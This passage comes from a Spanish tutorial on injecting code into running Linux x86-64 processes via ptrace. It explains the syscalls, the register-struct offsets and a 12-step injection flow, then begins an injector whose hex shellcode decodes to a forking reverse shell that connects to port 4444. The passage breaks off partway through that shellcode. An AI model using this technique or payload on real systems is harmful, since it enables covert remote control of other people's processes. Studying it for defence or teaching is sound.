</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">rsp</span><span class="p">]</span><span class="w">       </span><span class="c1">; donde guardar el resultado</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>Propósito</strong>: Leer datos de la memoria del tracee.</p>
<p><strong>Comportamiento</strong>:</p>
<ul>
<li>Lee exactamente 8 bytes (un qword en x86-64) de la dirección especificada.</li>
<li>Los datos se devuelven en el puntero proporcionado en R10.</li>
<li>La dirección debe ser válida en el espacio de direcciones del tracee.</li>
</ul>
<p><strong>Uso típico</strong>: Leer las instrucciones originales antes de sobrescribirlas, o inspeccionar datos en memoria.</p>
<hr />
<h4 id="ptrace_pokedata-5-0x05">PTRACE_POKEDATA (5 / 0x05)<a class="headerlink" href="#ptrace_pokedata-5-0x05" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">           </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">pid</span><span class="o">&gt;</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">addr</span><span class="o">&gt;</span><span class="w">      </span><span class="c1">; dirección a escribir en el tracee</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">value</span><span class="o">&gt;</span><span class="w">     </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>Propósito</strong>: Escribir datos en la memoria del tracee.</p>
<p><strong>Comportamiento</strong>:</p>
<ul>
<li>Escribe exactamente 8 bytes en la dirección especificada del tracee.</li>
<li>Puede escribir en cualquier región de memoria, incluso en regiones de solo lectura (como .text).</li>
<li>El kernel bypasea las protecciones de memoria normales.</li>
</ul>
<p><strong>Uso típico</strong>: Inyectar instrucciones, modificar datos, o escribir shellcode en memoria.</p>
<hr />
<h4 id="ptrace_singlestep-9-0x09">PTRACE_SINGLESTEP (9 / 0x09)<a class="headerlink" href="#ptrace_singlestep-9-0x09" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="w">           </span><span class="c1">; PTRACE_SINGLESTEP</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">pid</span><span class="o">&gt;</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>Propósito</strong>: Ejecutar una sola instrucción del tracee y detenerse.</p>
<p><strong>Comportamiento</strong>:</p>
<ul>
<li>Reanuda el tracee.</li>
<li>El tracee ejecuta exactamente una instrucción.</li>
<li>El tracee se detiene de nuevo automáticamente.</li>
<li>El tracer debe llamar a <code>wait()</code> para sincronizarse.</li>
</ul>
<p><strong>Uso típico</strong>: Ejecutar una syscall (como mmap) que hemos configurado previamente, y luego recuperar el resultado.</p>
<hr />
<h4 id="ptrace_detach-17-0x11">PTRACE_DETACH (17 / 0x11)<a class="headerlink" href="#ptrace_detach-17-0x11" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">17</span><span class="w">          </span><span class="c1">; PTRACE_DETACH</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">pid</span><span class="o">&gt;</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">         </span><span class="c1">; signal = 0 (no enviar señal)</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>Propósito</strong>: Desconectarse del tracee y permitir que continúe su ejecución normal.</p>
<p><strong>Comportamiento</strong>:</p>
<ul>
<li>Termina la relación tracer-tracee.</li>
<li>El tracee continúa ejecutándose normalmente.</li>
<li>Opcionalmente puede enviar una señal al tracee (nosotros enviamos 0 = ninguna).</li>
</ul>
<p><strong>Uso típico</strong>: Liberar el proceso después de haber completado la inyección.</p>
<hr />
<h2 id="estructura-user_regs_struct">Estructura user_regs_struct<a class="headerlink" href="#estructura-user_regs_struct" title="Permanent link">&para;</a></h2>
<p>En x86-64 Linux, la estructura <code>user_regs_struct</code> contiene todos los registros del CPU. Conocer su layout es esencial para manipular el estado del proceso:</p>
<table>
<thead>
<tr>
<th>Offset</th>
<th>Registro</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>r15</td>
<td>Registro de propósito general (callee-saved)</td>
</tr>
<tr>
<td>0x08</td>
<td>r14</td>
<td>Registro de propósito general (callee-saved)</td>
</tr>
<tr>
<td>0x10</td>
<td>r13</td>
<td>Registro de propósito general (callee-saved)</td>
</tr>
<tr>
<td>0x18</td>
<td>r12</td>
<td>Registro de propósito general (callee-saved)</td>
</tr>
<tr>
<td>0x20</td>
<td>rbp</td>
<td>Base pointer (callee-saved)</td>
</tr>
<tr>
<td>0x28</td>
<td>rbx</td>
<td>Registro de propósito general (callee-saved)</td>
</tr>
<tr>
<td>0x30</td>
<td>r11</td>
<td>Clobbered por syscall (almacena RFLAGS)</td>
</tr>
<tr>
<td>0x38</td>
<td>r10</td>
<td>4to argumento de syscall</td>
</tr>
<tr>
<td>0x40</td>
<td>r9</td>
<td>6to argumento de syscall</td>
</tr>
<tr>
<td>0x48</td>
<td>r8</td>
<td>5to argumento de syscall</td>
</tr>
<tr>
<td>0x50</td>
<td>rax</td>
<td>Número de syscall / valor de retorno</td>
</tr>
<tr>
<td>0x58</td>
<td>rcx</td>
<td>Clobbered por syscall (almacena RIP de retorno)</td>
</tr>
<tr>
<td>0x60</td>
<td>rdx</td>
<td>3er argumento de syscall</td>
</tr>
<tr>
<td>0x68</td>
<td>rsi</td>
<td>2do argumento de syscall</td>
</tr>
<tr>
<td>0x70</td>
<td>rdi</td>
<td>1er argumento de syscall</td>
</tr>
<tr>
<td>0x78</td>
<td>orig_rax</td>
<td>Número original de syscall (para restart)</td>
</tr>
<tr>
<td>0x80</td>
<td>rip</td>
<td>Instruction pointer (próxima instrucción)</td>
</tr>
<tr>
<td>0x88</td>
<td>cs</td>
<td>Code segment</td>
</tr>
<tr>
<td>0x90</td>
<td>eflags</td>
<td>Flags del CPU</td>
</tr>
<tr>
<td>0x98</td>
<td>rsp</td>
<td>Stack pointer</td>
</tr>
<tr>
<td>0xA0</td>
<td>ss</td>
<td>Stack segment</td>
</tr>
<tr>
<td>0xA8</td>
<td>fs_base</td>
<td>Base del segmento FS (usado para TLS)</td>
</tr>
<tr>
<td>0xB0</td>
<td>gs_base</td>
<td>Base del segmento GS</td>
</tr>
<tr>
<td>0xB8</td>
<td>ds</td>
<td>Data segment</td>
</tr>
<tr>
<td>0xC0</td>
<td>es</td>
<td>Extra segment</td>
</tr>
<tr>
<td>0xC8</td>
<td>fs</td>
<td>FS segment</td>
</tr>
<tr>
<td>0xD0</td>
<td>gs</td>
<td>GS segment</td>
</tr>
</tbody>
</table>
<p>La estructura tiene un tamaño total de <strong>27 qwords (216 bytes)</strong>.</p>
<hr />
<h2 id="consideraciones-sobre-little-endian">Consideraciones sobre Little-Endian<a class="headerlink" href="#consideraciones-sobre-little-endian" title="Permanent link">&para;</a></h2>
<p>x86-64 usa <strong>little-endian</strong>, lo que significa que el byte menos significativo (LSB) se almacena primero en memoria. Esto es crucial al trabajar con valores en memoria:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Valor en registro: 0x00007ffe6f9001b0
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Descomposición:
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>  0x 00 00 7f fe 6f 90 01 b0
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>     ▲                    ▲
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>     │                    │
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>    MSB                 LSB
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>   (más significativo) (menos significativo)
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>En memoria (little-endian, LSB primero):
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>RIP → 0x7f7a85496687:  ┌────┐
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>                       │ b0 │ ← Primer byte en memoria
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>      0x7f7a85496688:  ├────┤
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>                       │ 01 │
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>      0x7f7a85496689:  ├────┤
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>                       │ 90 │
</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>      0x7f7a8549668a:  ├────┤
</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>                       │ 6f │
</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>      0x7f7a8549668b:  ├────┤
</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>                       │ fe │
</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a>      0x7f7a8549668c:  ├────┤
</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>                       │ 7f │
</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>      0x7f7a8549668d:  ├────┤
</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>                       │ 00 │
</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a>      0x7f7a8549668e:  ├────┤
</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>                       │ 00 │
</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a>                       └────┘
</span></code></pre></div>
<p>Por esto, cuando inyectamos la instrucción <code>syscall</code> (bytes <code>0x0F 0x05</code>), debemos usar el valor <code>0x050F</code> en little-endian para que se almacene correctamente como <code>0F 05</code> en memoria.</p>
<hr />
<h2 id="flujo-general-de-la-inyeccion">Flujo general de la inyección<a class="headerlink" href="#flujo-general-de-la-inyeccion" title="Permanent link">&para;</a></h2>
<p>Antes de ver el código, entendamos el flujo completo:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>┌─────────────────────────────────────────────────────────────────┐
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>│  1. ATTACH: Conectarse al proceso víctima                       │
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>│     └─&gt; El proceso se detiene (SIGSTOP)                         │
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>│  2. GETREGS: Guardar estado original                            │
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>│     └─&gt; Backup de todos los registros                           │
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>│  3. PEEKDATA + POKEDATA: Inyectar instrucción &quot;syscall&quot;         │
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>│     └─&gt; Sobrescribir temporalmente donde apunta RIP             │
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>│  4. SETREGS: Configurar registros para mmap()                   │
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>│     └─&gt; RAX=9, RDI=0, RSI=4096, RDX=7, R10=34, R8=-1, R9=0      │
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>│  5. SINGLESTEP: Ejecutar mmap() en contexto víctima             │
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>│     └─&gt; Se reserva memoria RWX, dirección en RAX                │
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>│  6. GETREGS: Obtener resultado de mmap                          │
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>│     └─&gt; RAX contiene la dirección de la nueva memoria           │
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>│  7. POKEDATA: Restaurar bytes originales                        │
</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>│     └─&gt; Devolver el código original donde estaba RIP            │
</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>│  8. SETREGS: Restaurar registros originales                     │
</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>│     └─&gt; El proceso podría continuar normalmente                 │
</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>│  9. POKEDATA: Guardar RIP de retorno en memoria mmap            │
</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>│     └─&gt; Al final de la página (offset +4088)                    │
</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>│  10. POKEDATA (loop): Escribir shellcode                        │
</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>│      └─&gt; Copiar shellcode byte a byte a memoria RWX             │
</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>│  11. SETREGS: Redirigir RIP al shellcode                        │
</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>│      └─&gt; RIP = dirección base de mmap                           │
</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a>├─────────────────────────────────────────────────────────────────┤
</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a>│  12. DETACH: Liberar proceso                                    │
</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>│      └─&gt; El proceso continúa ejecutando el shellcode            │
</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a>└─────────────────────────────────────────────────────────────────┘
</span></code></pre></div>
<hr />
<h2 id="inyector-principal-proc_injasm">Inyector Principal (proc_inj.asm)<a class="headerlink" href="#inyector-principal-proc_injasm" title="Permanent link">&para;</a></h2>
<p>A continuación se presenta el código completo del inyector con explicaciones detalladas de cada sección:</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">section</span><span class="w"> </span><span class="nv">.data</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nl">shellcode:</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x39</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x74</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1d</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xec</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8b</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf8</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x70</span>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x29</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbe</span>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span>
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span>
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span>
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x51</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0xba</span><span class="p">,</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7f</span>
</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0x52</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span>
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xba</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x21</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span>
